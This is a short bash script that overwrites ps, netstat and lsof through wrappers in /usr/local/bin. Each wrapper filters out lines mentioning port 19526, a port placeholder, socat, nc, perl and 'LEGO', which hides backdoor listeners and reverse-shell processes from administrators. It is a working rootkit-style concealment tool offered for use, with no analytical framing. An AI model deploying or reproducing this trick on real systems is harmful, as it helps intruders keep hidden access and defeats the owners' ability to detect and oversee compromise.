#!/bin/bash

echo '#!/bin/bash
/bin/ps $@ | grep -Ev "<PORT>|19526|socat|LEGO|nc|perl"' > /usr/local/bin/ps	
chmod +x /usr/local/bin/ps

echo '#!/bin/bash
/bin/netstat $@ | grep -Ev "<PORT>|19526|socat|LEGO|nc|perl"' > /usr/local/bin/netstat
chmod +x /usr/local/bin/netstat

echo '#!/bin/bash
/usr/bin/lsof $@ | grep -Ev "<PORT>|19526|socat|LEGO|nc|perl"' > /usr/local/bin/lsof
chmod +x /usr/local/bin/lsof
